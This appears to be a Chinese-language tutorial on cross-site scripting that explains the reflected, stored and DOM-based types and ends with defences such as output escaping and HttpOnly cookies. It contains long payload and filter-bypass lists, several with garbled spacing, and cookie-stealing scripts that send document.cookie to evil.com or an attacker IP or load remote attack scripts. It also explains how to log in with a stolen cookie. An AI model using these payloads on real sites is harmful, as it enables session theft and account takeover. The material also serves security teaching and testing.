#  一文详述XSS漏洞   
 船山信安   2025-05-01 16:00  
  
## xss 漏洞介绍  
  
XSS 攻击全称跨站脚本攻击，是为不和层叠样式表(Cascading Style Sheets, CSS) 的缩写混淆，故将跨站脚本攻击缩写为 XSS。攻击者利用浏览器的动态展示数据功能，在HTML页面里嵌入恶意代码。当用户浏览该页时，这些潜入在HTML中的恶意代码会被执行，用户浏览器被攻击者控制，从而达到攻击者的特殊目的，如 cookie窃取等。XSS 的运行原理是将恶意的 script 脚本插入进 html/css/js 文件当中。  
### XSS 攻击的危害包括  
  
网络钓鱼，包括获取各类用户账号；  
  
窃取用户cookies资料，从而获取用户隐私信息，或利用用户身份进一步对网站执行操作；  
  
劫持用户（浏览器）会话，从而执行任意操作，例如非法转账、强制发表日志、电子邮件等；  
  
强制弹出广告页面、刷流量等；  
  
网页挂马；  
  
进行恶意操作，如任意篡改页面信息、删除文章等；  
  
进行大量的客户端攻击，如ddos等；  
  
获取客户端信息，如用户的浏览历史、真实ip、开放端口等；  
  
控制受害者机器向其他网站发起攻击；  
  
结合其他漏洞，如csrf，实施进步危害；  
  
提升用户权限，包括进一步渗透网站；  
  
传播跨站脚本蠕虫等。  
  
测试语句：  
```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<a href=javascript:alert(1)>
```  
  
  
<svg onload=alert(1)>：在SVG中，onload属性是一个事件处理器，用于在SVG文档加载完成后触发。这个属性可以用于执行当SVG元素完全加载到DOM中时需要执行的JavaScript代码。这与HTML中的onload事件类似，但专门用于SVG元素。  
  
<a href=javascript:alert(1)>：javascript:alert(1)：这是一个javascript:伪协议URL，后面跟着的是要执行的JavaScript代码。当用户点击这个链接时，浏览器会执行alert(1)函数，显示一个包含数字1的警告框。javascript:伪协议是一种在浏览器中执行JavaScript代码的方法。它通常用于动态地执行一些脚本，而不需要离开当前页面或者加载新的页面。这种伪协议可以在HTML元素的属性中使用，比如href属性在锚点（<a>）标签中，或者在其他需要执行脚本的场合。  
## 反射型xss  
  
反射型XSS又称非持久型XSS，这种攻击属于一次性攻击，只是简单的把用户输入的数据“反射”给浏览器。恶意代码一般存放于链接当中，攻击者将包含XSS代码的恶意链接发送给目标用户，当目标用户访问该链接时，服务器接受该目标用户的请求并进行处理，然后服务器把带有XSS代码的数据发送给目标用户的浏览器，浏览器解析这段带有XSS代码的恶意脚本后，就会触发XSS，也就是说攻击者往往需要诱使用户点击恶意链接才能攻击成功。  
  
常见的注入点：网站的搜索栏、用户登录入口、输入表单等地方。常用来窃取客户端Cookie或钓鱼欺骗。  
  
产生的原因一般是网站只是简单的将用户输入的数据直接或未经过完善的安全过滤就在浏览器中输入，导致输出的数据中存在可被浏览器执行的代码数据。  
  
在输入框中输入字符串，提交后输出框将输出相同字符串  
  
响应页面源代码，服务器端对输入未经任何过滤直接将输出到返回页面中。  
  
输入以下内容："><img src=1 onerror=alert(/xss/) />  
  
输入的双引号闭合了value属性的双引号，输入的“>”闭合了input标签的“<”，这使得输入的“<img src=1 onerror=alert(/xss/) />”成为一个独立的html标签。  
  
在浏览器渲染时，会执行<img src=1 onerror=alert(/xss/) />这个语句，其是一个 HTML 图像元素（`<img>` 标签），其中包含了一个 `src` 属性和一个 `onerror` 事件处理器。 `src=1`：`src` 属性通常用来指定图像的来源，即图像文件的 URL。在这里，它被设置为数字 `1`，这通常不是一个有效的图像文件路径，因此浏览器无法加载这个图像。`onerror=alert(/xss/)`：`onerror` 事件处理器会在图像加载失败时触发。  
## 存储型  
  
又称持久型XSS，比反射型XSS更具有威胁性，攻击脚本会永久的存储在目标服务器的数据库或文件中，具有一定的隐蔽性。这种攻击方式多见于论坛、博客和留言板，攻击者在发帖的过程中，将恶意脚本与正常信息一起注入到留言中，随着留言被服务器存储下来，恶意脚本也被存储到存储器中。当其他用户浏览这个被注入恶意脚本的留言时，恶意脚本就会在用户的浏览器被执行。存储型XSS能将恶意代码永久的嵌入页面中，所有访问这个页面的用具都将成为受害者。造成漏洞原因一般是由于Web应用程序对用户输入数据的不严格，导致Web应用程序将黑客输入的恶意跨站攻击数据信息保存在服务端的数据库或其他文件形式中。  
  
常见注入点：论坛、博客、留言板、网站的留言、评论、日志等交互处。  
  
输入内容：  
  
提交的内容存储到数据库：  
  
并显示到页面中：  
  
输入：<img src=1 onerror=alert(/xss/) />  
  
标题和内容中输入的数据被提交后存储在数据库中，并将这些数据从数据库查找出来输出在页面中，导致所有用户打开该页面时都会执行该语句。  
#### 代码分析  
  
程序直将输入不经过滤直接插入到数据库中，在输出显示结果时也是将记录从数据库中取出然后不做过滤直接插入到前端页面中。  
## DOM型  
  
DoM是文档对象模型（ Document Object Model）的缩写。它是HTML文档的对象表示，同时也是外部内容（例如 JavaScript）与HTML元素之间的接口。解析树的根节点是“ Document”对象。DOM（ Document object model），使用DOM能够使程序和脚本能够动态访问和更新文档的内容、结构和样式。  
  
DOM型的XSS是通过修改页面DOM节点数据信息而形成的XSS跨站脚本攻击。不同于反射型XSS和存储型XSS，基于DOM的XSS跨站脚本攻击往往需要针对具体的 Javascript DOM代码进行分析，并根据实际情况进行XSS跨站脚本攻击的利用。  
  
并且DOM型XSS是基于JS上的，并不需要与服务器进行交互，它只发生在客户端处理数据的阶段。当用户请求一个包含XSS恶意代码的URL，服务器的响应不会以任何形式包含攻击者的脚本，当用户的浏览器处理这个响应时，DOM对象就会处理XSS代码。造成漏洞的原因：这是一种基于DOM的跨站，这是客户端脚本本身解析不正确导致的安全问题。  
  
常见注入点：通过js脚本对文档对象进行编辑，从而修改页面的元素。也就是说，客户端的脚本程序可以DOM动态修改页面的内容，从客户端获取DOM中的数据并在本地执行。由于DOM是在客户端修改节点的，所以基于DOM型的XSS漏洞不需要与服务器端交互，它只发生在客户端处理数据的阶段  
  
反射型XSS与DOM型区别：反射型XSS攻击中，服务器在返回HTML文档的时候，就已经包含了恶意的脚本;DOM型ⅩSS攻击中，服务器在返回HTML文档的时候，是不包含恶意脚本的；恶意脚本是在其执行了非恶意脚本后，被注入到文档里的。  
  
点击替换，将顶部的文字替换为输入框中的内容  
  
输入：<img src=1 onerror=alert(/xss/) />  
#### 代码分析  
  
上面说的替换过程并没有与服务器进行交互，而是通过JavaScript的dom操作完成：点击替换时，触发一个JavaScript函数将顶部元素（dom中称为节点）的文字内容替换为“输入内容”，浏览器渲染该页面时就执行了该语句。  
  
以下是一些经常出现domxss的关键语句  
  
document.referer属性  
  
window.name属性  
  
location属性  
  
innerHTML属性  
  
documen.write属性  
### xss测试语句  
  
在网站是否存在xss漏洞时，应该输入一些标签如测试语句查看符号和关键字是否被过滤，如果没过滤，很大可能存在xss漏洞。  
  
常用的测试语句  
  
<h5>1</h5>       <h5>1</h5> 会以第五级标题的样式显示数字“1”。  
  
<span>1</span>    <span> 是一个行内元素标签，<span>1</span> 与直接写“1”在视觉上没有区别。  
  
<script>console.log(1);</script>   console.log(1);在浏览器的控制台输出数字“1”，常用于调试目的。   
  
常见标签  
```
<script>alert(1)</script>
<img>标签
<imgsrc=javascript:alert(“xss”)>
<IMGSRC=javascript:alert(String.formCharCode(88,83,83))>
<imgscr=”URL”style=’Xss:expression(alert(/xss));’
<imgsrc=”x”onerror=alert(1)>
<imgsrc=”1″onerror=eval(“alert(‘xss’)”)>
<imgsrc=1onmouseover=alert(‘xss’)>
<a>标签
标准格式<ahref=”https://www.baidu.com”>baidu</a>
<ahref=”javascript:alert(‘xss’)”>aa</a>
<ahref=javascript:eval(alert(‘xss’))>aa</a>
<ahref=”javascript:aaa”onmouseover=”alert(/xss/)”>aa</a>
<ahref=””onclick=eval(alert(‘xss’))>aa</a>
<ahref=kycg.asp?ttt=1000onmouseover=prompt(‘xss’)y=2016>aa</a>
<input>标签
<inputvalue=””onclick=alert(‘xss’)type=”text”>
<inputname=”name”value=””onmouseover=prompt(‘xss’)bad=””>
<inputname=”name”value=””><script>alert(‘xss’)</script>
<form>标签
<formaction=javascript:alert(‘xss’)method=”get”>
<formaction=javascript:alert(‘xss’)>
<formmethod=postaction=aa.asp?onmouseover=prompt(‘xss’)>
<formmethod=postaction=aa.asp?onmouseover=alert(‘xss’)>
<formaction=1onmouseover=alert(‘xss)>
<formmethod=postaction=”data:text/html;base64,<script>alert(‘xss’)</script>”>
<formmethod=postaction=”data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=”>
<iframe>标签
<iframesrc=javascript:alert(‘xss’);height=5width=1000/><iframe>
<iframesrc=”data:text/html,<script>alert(‘xss’)</script>”></iframe>
<iframesrc=”data:text/html;base64,<script>alert(‘xss’)</script>”>
<iframesrc=”data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=”>
<iframesrc=”aaa”onmouseover=alert(‘xss’)/><iframe>
<iframesrc=”javascript:prompt(xss)”></iframe>
<svg>标签
<svgonload=alert(1)>
CSS
<img STYLE=”background-image:url(javascript:alert(‘XSS’))”>
(1)普通的XSSJavaScript注入
(2)IMG标签XSS使用JavaScript命令
(3)IMG标签无分号无引号
(4)IMG标签大小写不敏感
(5)HTML编码(必须有分号)
(6)修正缺陷IMG标签
<IMG"""><SCRIPT>alert("XSS")</SCRIPT>">
(7)formCharCode标签(计算器)
(8)UTF-8的Unicode编码(计算器)
(9)7位的UTF-8的Unicode编码是没有分号的(计算器)
<IMGSRC=jav..省略..S')>
(10)十六进制编码也是没有分号(计算器)
(11)嵌入式标签,将Javascript分开
(12)嵌入式编码标签,将Javascript分开
<IMGSRC="javascript:alert('XSS');">
(13)嵌入式换行符
(14)嵌入式回车
(15)嵌入式多行注入JavaScript,这是XSS极端的例子
(16)解决限制字符(要求同页面)
<script>z='document.'</script><script>z=z+'write("'</script><script>z=z+'<script'</script><s
cript>z=z+'
src=ht'</script><script>z=z+'tp://ww'</script><script>z=z+'w.shell'</script><script>z=z+'.ne
t/1.'</script><script>z=z+'js></sc'</script><script>z=z+'ript>")'</script><script>eval_r(z)<
/script>
(17)空字符12-7-1T00LS-PoweredbyDiscuz!Board
https://www.a.com/viewthread.php?action=printable&tid=152672/6perl-e'print"<IMG
SRC=java\0script:alert(\"XSS\")>";'>out
(18)空字符2,空字符在国内基本没效果.因为没有地方可以利用
perl-e'print"<SCR\0IPT>alert(\"XSS\")</SCR\0IPT>";'>out
(19)Spaces和meta前的IMG标签
(20)Non-alpha-non-digitXSS
<<SCRIPT>alert("XSS");//<</SCRIPT>
(24)无结束脚本标记(仅火狐等浏览器)
(25)无结束脚本标记2
(26)半开的HTML/JavaScriptXSS
(27)双开角括号
(28)无单引号双引号分号
<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
(29)换码过滤的JavaScript
\";alert('XSS');//
(30)结束Title标签
(31)InputImage
(32)BODYImage
(33)BODY标签
<BODY('XSS')>
(34)IMGDynsrc
(35)IMGLowsrc
(36)BGSOUND
(37)STYLEsheet
(38)远程样式表
(39)List-style-image(列表式)
<STYLE>li{list-style-image:url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS
(40)IMGVBscript
<IMGSRC='vbscript:msgbox("XSS")'></STYLE><UL><LI>XSS
(41)META链接url
(42)Iframe
(43)Frame
<FRAMESET><FRAMESRC="javascript:alert('XSS');"></FRAMESET>12-7-1T00LS-PoweredbyDiscuz!
Boardhttps://www.a.com/viewthread.php?action=printable&tid=152673/6
(44)Table
(45)TD
<TABLE><TDBACKGROUND="javascript:alert('XSS')">
(46)DIVbackground-image
(47)DIVbackground-image后加上额外字符(1-32&34&39&160&8192-8&13&12288&65279)
(48)DIVexpression
(49)STYLE属性分拆表达
(50)匿名STYLE(组成:开角号和一个字母开头)
(51)STYLEbackground-image
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><ACLASS=XSS></A>
(52)IMGSTYLE方式
exppression(alert("XSS"))'>
(53)STYLEbackground
<STYLE><STYLEtype="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
(54)BASE
(55)EMBED标签,你可以嵌入FLASH,其中包涵XSS
(56)在flash中使用ActionScrpt可以混进你XSS的代码
a="get";b="URL(\"";c="javascript:";d="alert('XSS');\")";eval_r(a+b+c+d);
(57)XMLnamespace.HTC文件必须和你的XSS载体在一台服务器上
<HTMLxmlns:xss><?importnamespace="xss"
implementation="http://3w.org/XSS/xss.htc"><xss:xss>XSS</xss:xss></HTML>
(58)如果过滤了你的JS你可以在图片里添加JS代码来利用
(59)IMG嵌入式命令,可执行任意命令
(60)IMG嵌入式命令(a.jpg在同服务器)
Redirect302/a.jpghttp://www.XXX.com/admin.asp&deleteuser
(61)绕符号过滤
(62)<SCRIPT=">"SRC="http://3w.org/xss.js"></SCRIPT>
(63)<SCRIPTa=">""SRC="http://3w.org/xss.js"></SCRIPT>
(64)<SCRIPT"a='>'"SRC="http://3w.org/xss.js"></SCRIPT>
(65)<SCRIPTa=`>`SRC="http://3w.org/xss.js"></SCRIPT>
(66)12-7-1T00LS-PoweredbyDiscuz!Board
https://www.a.com/viewthread.php?action=printable&tid=152674/6<SCRIPTa=">'>"
SRC="http://3w.org/xss.js"></SCRIPT>
(67)<SCRIPT>document.write("<SCRI");</SCRIPT>PTSRC="http://3w.org/xss.js"></SCRIPT>
(68)URL绕行
<AHREF="http://127.0.0.1/">XSS</A>
(69)URL编码
<AHREF="http://3w.org">XSS</A>
(70)IP十进制
<AHREF="http://3232235521″>XSS</A>
(71)IP十六进制
<AHREF="http://0xc0.0xa8.0×00.0×01″>XSS</A>
(72)IP八进制
<AHREF="http://0300.0250.0000.0001″>XSS</A>
(73)混合编码
<AHREF="http://66.000146.0×7.147/"">XSS</A>
节省[http:]
<AHREF="//www.google.com/">XSS</A>
节省[www]
<AHREF="http://google.com/">XSS</A>
绝对点绝对DNS
<AHREF="http://www.google.com./">XSS</A>
javascript链接
<AHREF="javascript:document.location='http://www.google.com/'">XSS</A>
```  
  
### 限制绕过  
  
实际应用中web程序往往会通过一些过滤规则来防止代有恶意代码的用户输入被显示。当上述代码（常见标签中的代码）被注入到输入框或者URL参数中时，可能会成功也可能会失败，如果失败了，并不意味着网站不存在XSS漏洞，需要对其进行绕过等方式发掘安全漏洞。这里，给大家总结一些XSS绕过方法。  
  
**闭合标签**  
  
常规闭合，通过各种方式，闭合前面的语句。  
```
function escape(input) {
// warm up
// script should be executed without user interaction
return ‘<input type=”text” value=”‘ + input + ‘”>’;
}
“><script>alert(1);script>
```  
  
  
**双写半开括号**  
```
function escape(input) {
// tags stripping mechanism from ExtJS library
// Ext.util.Format.stripTags
var stripTagsRE = /<\/?[^>]+>/gi;
input = input.replace(stripTagsRE, ”);
return ‘<article>’ + input + ‘</article>’;
}
```  
  
  
以上代码中正则会处理尖括号和尖括号中的内容，将其替换成空。所以可以使用双写半开括号”<<“绕过:  
```
<img src=1 onerror=”prompt(1)”<
```  
  
  
**反引号+编码**  
```
function escape(input) {
// v– frowny face
input = input.replace(/[=(]/g, ”);
// ok seriously, disallows equal signs and open parenthesis
return input;
}
```  
  
  
以上代码对等号和左括号进行过滤，所以使用反引号代替括号，在通过编码解决。  
  
<script>setTimeoutprompt\u00281\u0029;</script>  
  
**闭合注释**  
```
function escape(input) {
// filter potential comment end delimiters
input = input.replace(/->/g, ‘_’);
// comment the input to avoid script execution
return ‘<!– ‘ + input + ‘ –>’;
}
```  
  
  
以上代码将输出的内容放在注释中，且对->做了替换处理。所以html可以–>或–!>闭合注释  
```
–!><script>prompt(1)</script>
```  
  
  
**闭合大部分的标签**  
```
*/–>'”);>iframe>script>style>title>textarea><a>aa>#*/–>'”);>iframe>script>style>title>textarea><iframe >
```  
  
  
**宽字符闭合**  
  
*/–>%cf”%d5′>frame>script>style>title>textarea>  
  
**回车换行**  
  
很多时候，回车换行能绕过很多的限制  
  
%0D%0A  
  
**标签检测绕过**  
当页面过滤 alert 这个函数时，因为这个函数会弹窗，不仅很多程序会对他进行  
  
过滤，而且很多 waf 都会对其进行拦截。所以不存在 alert 即可<script>prompt(/xss/);</script>  
  
<script>confirm(1);</script>  
  
<script src=http://www.xss123.com/eciAKj?1623635663></script>  
  
或者：  
  
fuzz各种标签，检查是否存在拦截或者过滤  
  
**针对黑名单**  
  
大小写混写<ScRipt>ALeRt(“XSS”);sCRipT>  
  
双写绕过<scscriptript>alert(1)</scriscriptpt>  
  
嵌套绕过ript>alert(/xss/);script>alert(/xss/);script>  
  
空字符绕过，09ipt>ALeRt(/XSS/);sCRipT>  
  
特殊字符黑名单，采用其他字符代替，如：  
  
限制 ” 符号，输入<img src=1 onclick=alert(‘1’)>  
  
限制 ‘ 符号，输入(开启gpc或者addcslashes()过滤特殊字符)  
```
<img src=1 onclick=alert(/1/)>、
<img src=1 onclick=”alert(1)”>
<img src=1 onclick=alert(xss)>
<script src=http://www.xss123.com/JGdbsl?1623638390></script>
```  
  
  
限制 () 符号，输入<img src=1 onclick=”alert `’1’`”>  
  
限制 () ‘ ” 符号，输入<img src=1 onclick=alert `1`>  
  
或使用实体编码绕过。  
  
绕过字符长度限制  
  
利用事件缩短长度，如，“onclick=alert(1)//”  
  
使用base标签，base标签可以运用于页面的任何地方，且作用于之后的所有标签。通过在页面插入base标签，就可以在远程服务器伪造图片，链接或脚本，劫持页面的相对路径的标签。  
  
对window.name赋值，没有特殊的字符限制。因为window对象是浏览器的窗体，而不是document对象。因此很多时候window对象不受同源策略的限制。可以用这个实现跨域，跨界面的传递。  
  
**过滤特殊字符**  
  
在程序里如果使用 html 实体过滤 在 php 会使用 htmlspecialchars()对输入的字符  
  
进行实体化 实体化之后的字符不会在 html 执行。把预定义的字符 "<" （小于）  
  
和 ">" （大于）转换为 HTML 实体，构造 xss 恶意代码大多数都必须使用<或  
  
者>，这两个字符被实体化后在 html 里就不能执行了。  
  
预定义的字符是：  
  
& (和号)成为 &amp  
  
" (双引号)成为 &quot  
  
’(单引号)成为'  
  
< (小于)成为 &lt  
  
>(大于)成为 &gt  
  
htmlspecialchars()有一个可选项，指定如何处理引号、无效编码以及使用的文档类型。可选值包括：  
  
ENT_COMPAT：仅转换双引号。  
  
ENT_QUOTES：转换双引号和单引号。  
  
ENT_NOQUOTES：不转换引号。  
  
如果htmlspecialchars()仅转换双引号或者不转换引号，那么有机会被绕过。  
##### 编码绕过  
  
**ascii 编码**  
```
<script>alert(String.fromCharCode(88,83,83))</script>
```  
  
  
**url 编码**  
```
<a href="javascript:%61%6c%65%72%74%28%32%29">123</a>
```  
  
  
**JS 编码**  
  
https://www.jb51.net/tools/zhuanhuan.htm  
  
八进制编码  
```
<script>eval("\141\154\145\162\164\50\61\51");</script>
```  
  
  
16 进制编码  
```
<script>eval("\x61\x6c\x65\x72\x74\x28\x31\x29")</script>
```  
  
  
js unicode 编码  
```
<script>\u0061\u006c\u0065\u0072\u0074('xss');</script>
```  
  
  
**HTML 编码**  
```
在=后可以解析 html 编码
十进制
<img src="x" onerror="alert(1)" />
<button onclick="confirm('7');">Button</button>
十六进制
<img src="x" onerror="alert(1)" />
```  
  
  
**base64 编码**  
  
使用伪协议 base64 解码执行 xss  
```
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>
```  
  
  
在线编码/解码工具：站长工具-编码解码在线、107000工具站、在线jsons字符实体转换、在线HTML字符实体转换  
  
4.使用其他标签，<a>、<href>、<img>等；  
  
5.使用空字符，在关键词中添加空字符；  
1. 使用转义字符；  
  
常规Waf绕过思路  
  
[+] 标签语法替换  
  
[+] 特殊符号干扰 比如 / #  
  
[+] 提交方式更改 Request的前提下，Waf只检查URL内容而不检查POST内容  
  
[+] 垃圾数据溢出  
  
[+] 加密解密算法  
  
[+] 结合其他漏洞绕过  
  
XSS自动化工具  
  
Xwaf，下载地址：github.com/3xp10it/xwaf  
  
XSStrike，下载地址：github.com/s0md3v/XSStr  
  
Fuzzing测试：  
  
在线生成Fuzzing字典：https://xssfuzzer.com/fuzzer.html  
  
Fuzzing字典：https://github.com/TheKingOfDuck/fuzzDicts  
## 构造xss攻击paload  
  
<a href="javascript:eval(document.location='http://192.168.0.170/?cookie='+document.cookie)">xss</a>  
  
攻击原理：  
  
当用户点击这个链接时，eval() 函数会执行 document.location 的赋值操作，将当前页面的 URL 重定向到 http://192.168.0.170/?cookie=，并附加当前页面的 Cookie 信息。攻击者可以通过监听 http://192.168.0.170/ 的请求，获取用户在当前页面的 Cookie 信息，从而可能窃取用户的登录凭证或其他敏感信息。  
  
改进：  
  
创建一个新的Image对象，并将其src属性设置为http://192.168.0.170/?cookie=...，这将导致浏览器向该URL发送一个包含用户Cookie信息的请求。紧接着使用window.location将用户重定向到一个正常的页面（例如http://example.com）。由于Image对象的请求是异步的，用户通常不会注意到Cookie被发送。  
  
<a href="javascript:  
  
(function()  
  
{var i=new Image();  
  
i.src='http://192.168.0.170/?cookie='+encodeURIComponent(document.cookie);  
  
window.location='http://example.com';})();">xss</a>  
## 构造远程攻击的paylod  
###### 构建payload，用于引入外部 JavaScript 文件：  
  
当发现存在xss漏洞时，如果只是弹出信息窗口，这样只能证明存在一个xss漏  
  
洞，想再进一步深入的话，就必须学会加载xss攻击payload。  
  
引号可以去掉  
  
<script src="http://www.evil.com/xss.js"></script>  
  
<script src="https://www.evil.com/xss.js"></script>  
  
去掉http，自动选择协议  
  
<script src=//www.evil.com/xss.js></script>  
  
<script src="//192.168.216.99:81/xss.js"></script>  
###### 创建恶意脚本文件  
  
恶意的xss语句实现很多功能，其中最常用的是获取对方浏览器的cookie。  
  
将下面的恶意代码保存为javascript文件  
  
var img=document.createElement("img");  
  
img.src="http://www.evil.com/log?"+escape(document.cookie);  
  
document.body.appendChild(img);  
  
这段代码的主要功能是通过动态创建一个<img>元素，将当前页面的cookie信息发送到指定的服务器地址。  
  
创建<img>元素：  
  
var img = document.createElement("img");  
  
这行代码使用document.createElement方法创建了一个新的<img>元素，并将其赋值给变量img。  
  
设置图片的src属性：  
  
img.src = "http://www.evil.com/log?" + escape(document.cookie);  
  
这里，将img元素的src属性设置为http://www.evil.com/log?后跟当前文档的cookie信息。document.cookie返回当前页面的所有cookie，格式为键值对的字符串。escape函数用于对cookie字符串进行编码，确保特殊字符在URL中被正确传输。  
  
将<img>元素添加到文档中：  
  
document.body.appendChild(img);  
  
这行代码将创建的img元素添加到当前文档的<body>中，使浏览器开始加载该图片。由于src指向包含cookie信息的URL，浏览器会向http://www.evil.com/log发送一个带有cookie数据的HTTP请求。  
###### 获取cookie:  
  
在kali终端输入sudo python -mSimple HTTPServer80 打开一个小型web服务，登陆dvwa后台输入xss代码，插入之后，受害者访问该网页就会把它的cookie  
  
发送到kali的web服务上。查看日志就能得到cookie  
###### 用<img>元素加载外部JavaScript 文件<img src='' onerror=  
  
document.body.appendChild(document.createElement('script')).src='//192.168.0.110/xss.js'>  
###### 字符拼接加载外部JavaScript 文件  
  
当程序对输入的字符有限制的时候，可以考虑将js代码先拆分多个部分上传，然后在浏览器解析的时候拼接，最后用eval()函数将拼接好的代码执行。  
  
<script>z='document.'</script>  
  
<script>z=z+'write("'</script>  
  
<script>z=z+'<script'</script>  
  
<script>z=z+' src=ht'</script>  
  
<script>z=z+'tp://www.'</script>  
  
<script>z=z+'xsstools'</script>  
  
<script>z=z+'.com/a'</script>  
  
<script>z=z+'mER></sc'</script>  
  
<script>z=z+'ript>")'</script>  
  
<script>eval(z)</script>  
  
有的情况要用/**/注释不需要的代码。  
  
上面的多个字符串在变量z中最终拼接成：  
  
document.write("<script src=http://www.xsstools.com/amER></script>")  
  
然后将拼接好的字符串作为js代码执行：  
  
<script>eval(z)</script>  
  
这行代码尝试通过 document.write 动态插入一个 <script> 标签，该标签的 src 属性指向一个外部 JavaScript 文件。  
###### 使用jQuery加载外部javascript代码  
  
jQuery 是由 John Resig 在 2006 年发布的开源 JavaScript 库。它的核心理念是 “Write Less, Do More”（写得更少，做得更多），通过提供简洁的语法和高效的工具，帮助开发者快速实现复杂的前端功能。jQuery 提供了一套简单易用的 API，用于操作 HTML 文档。  
  
如果浏览器加载了jQuery库那么就可以使用这个库的语法加载外部js文件。下面这行代码就是使用jQuery 的 $.getScript() 方法来动态加载并执行一个外部 JavaScript 文件。  
  
<script>$.getScript("//www.xsstools.com/xss.js");</script>  
### 使用xss 漏洞利用平台  
  
XSS Platform 是一个经典的 XSS渗透测试管理系统，它集合了 xss 攻击的多种方法，很方便快捷的利用 xss 漏洞，生成攻击代码。  
  
将恶意代码插入url中并发送给普通用户，且该用户的浏览器持有这个网站的cookie，用户访问后就会将cookie发送给攻击者的服务器中。  
  
或者：  
  
将恶意代码插入存在漏洞的页面，当用户访问有问题的网页时，浏览器会加载恶意的攻击代码，会获取当前受害者访问网站的 cookie 发送到攻击者的服务器里。  
  
受害者访问页面后，攻击者的服务器就会收到受害者的cookie等信息  
  
利用盗取的cookie登录网站：访问网站时抓包，将cookie换成受害者的cookie，然后放行  
  
成功登录  
## 实际利用  
#### 反射型XSS、DOM型XSS  
  
验证测试情况  
  
在网站的搜索栏、用户登录入口、输入表单等处输入payload，查看页面是否有弹框，则存在反射型XSS漏洞；  
  
现实攻击情况  
  
攻击者寻找具有XSS漏洞的网站，植入payload构造恶意链接，将恶意链接发给用户，诱骗用户点击，用户点击此链接，XSS攻击执行。为了更加隐蔽的隐藏攻击代码，可以把当前的代码进行缩短再发送给目标。  
  
dom 型 xss 是用过改变 html 的属性或动作造成的 xss 型漏洞。在挖掘漏洞时需额外关注能操作 html 属性的函数，特别是 document.getElementById、  
  
document.getElementsByName、document.getElementsByTagName  
  
getElementById()  
  
返回对拥有指定 id 的第一个对象的引用。  
  
getElementsByName()  
  
返回带有指定名称的对象集合。  
  
getElementsByTagName()  
  
返回带有指定标签名的对象集合。  
  
getelementbyid.innerHTML 更改 html 的字符串  
  
和 js 输出的函数  
  
document.write();  
#### 存储型XSS  
  
验证测试情况  
  
在论坛、博客、留言板、网站的留言、评论、日志等交互处输入payload，查看页面是否有弹框。若有，先切换至网站其他页面，再返回输入payload的页面，若依旧出现弹窗，则存在存储型XSS漏洞。  
  
现实攻击情况  
  
攻击者在发帖或留言的过程中，将恶意脚本连同正常信息一起注入到发布内容中。随着发布内容被服务器存储下来，恶意脚本也将永久的存放到服务器的后端存储器中。当其他用户浏览这个被注入了  
  
恶意脚本的帖子时，恶意脚本就会在用户的浏览器中得到执行。  
  
常用payload：  
  
<script>alert(1)</script> // 调用JavaScript语句  
  
<img src=x onerror=alert(1)> // src是错误的 就会调用error函数  
  
<a href=javascript:alert(1)> // 点击a即可触发  
  
<svg onload=alert(1)> // 使用svg标签  
## xss 防御  
  
形成XSS漏洞的主要原因是程序对输入和输出的控制不够严格，导致“精心构造”的脚本输入后，在输到前端时被浏览器当作有效代码解析执行从而产生危害。因此在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理。输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;输出转义：根据输出点的位置对输出到前端的内容进行适当转义。  
  
输入检查  
  
输入检查的逻辑必须放在服务器端代码中实现，如果只是在客户端使用Javascript进行输入检查，很容被绕过。目前Web开发的普遍做法是同时在客户端Javascript中和服务器端代码中实现相同的输入检查。客户端JavaScript的输入检查，可以阻挡大部分误操作的正常用户，而节约服务器资源。  
  
检查内容：  
1. 检查特殊字符，如<、>、’、”等，如果发现存在特殊字符，则将其过滤或者编码；  
  
1. XSS Filter，会检查XSS特征的敏感字符，如<script>、javascript等敏感字符；  
  
1. 字符串是否超过最大长度限制；  
  
1. 数字是否在指定的范围；  
  
1. 是否符合特殊格式的要求  
  
输出检查  
  
一般而言，除了富文本的输出外，在变量输出到HTML页面时，可以使用编码或转译的方式防御XSS攻击。  
  
使用安全的编码函数：  
  
HtmlEncode编码方式，针对HTML代码；  
  
JavascriptEncode编码方式，针对JavaScript；  
  
htmlentities()、htmlspecialchars()函数，针对PHP；  
  
XMLEncode、JSONEncode等。  
  
处理富文本  
  
在过滤富文本时，“事件”应被严格禁止，因为富文本的展示需求里不应该包括“事件”这种动态效果；  
  
在标签的选择上，应该使用白名单，避免使用黑名单。白名单同样也应用于属性与事件的选择；  
  
尽可能禁止用户自定义CSS与style；  
  
防御DOM型XSS  
  
DOM型XSS是一种比较特别的XSS漏洞，以上防御方法不太适用，需要特别对待。  
  
从JavaScript输出到HTML页面，也相当于一次XSS输出的过程，所以需要分语境使用不同的编码函数。  
  
其他加固方式  
  
Anti_XSS  
  
微软开发的，.NET平台下的，用于防止XSS攻击的类库，它提供了大量的编码函数来对用户输入的数据进行编码，可以实现基于白名单的输入的过滤和输出的编码。  
  
HttpOnly Cookie  
  
当Cookie在消息头中被设置为HttpOnly时，这样支持Cookie的浏览器将阻止客户端Javascript直接访问浏览器中的Cookies，从而达到保护敏感数据的作用。  
  
Noscript  
  
Noscript是一款免费的开源插件，该插件默认禁止所有的脚本，但可以自定义设置允许通过的脚本。  
  
WAF  
  
使用WAF，比如软件WAF、硬件WAF、云WAF。  
  
在修补XSS漏洞时遇到最大挑战之一就是漏洞数量太多，因此开发者可能来不及也不情愿修补这些漏洞，从业务风险的角度来重新定位每个XSS漏洞，就具有了重要的意义。理论上讲，XSS漏洞虽然复杂，但是却是可以彻底解决的，在设计XSS解决方案时，应该深入理解XSS攻击的原理，针对不同的场景使用不同的方法。同时也可以参考很多的开源项目。  
  
  
